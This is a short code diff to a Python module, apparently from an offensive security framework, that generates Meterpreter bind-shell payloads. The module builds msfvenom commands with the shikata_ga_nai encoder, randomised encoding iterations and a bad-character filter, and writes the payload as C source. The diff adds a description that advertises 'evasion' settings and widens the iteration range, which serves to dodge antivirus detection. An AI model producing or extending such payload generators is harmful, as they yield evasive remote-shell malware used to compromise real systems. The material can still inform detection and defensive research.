@@ -5,7 +5,12 @@ import os, random, importlib
 class Payload(controller.Module):
 	__info__ = {
 		'name': 'Meterpreter Bind Connection',
-		'description': '',
+		'description': [
+			'Meterpreter Bind Shell generator',
+			":help' for help banner",
+			":show platforms' for advanced platform setting",
+			":show evasions; for advanced evasion technology setting"
+		],
 		'author': [
 			'Module: dmknght, dmknghtx2team@gmail.com',
 			'Technology: Diego Cornacchini, oddcod3@gmail.com'
@@ -32,7 +37,7 @@ class Payload(controller.Module):
 				},
 				'linux': 'msfvenom -p linux/{}/meterpreter/bind_tcp -a '.format(self.architecture, self.architecture)
 			}
-			randiter = str(random.randint(10, 15))
+			randiter = str(random.randint(7, 18))
 			generate = generate[self.platform][self.architecture] + 'lport={} '.format(self.lport)
 			generate += '--smallest -e x86/shikata_ga_nai -f c -b "\\x00\\x0a\\x0d" -i {} '.format(randiter)
 			src_output = 'output/meterpreter_bind.c'
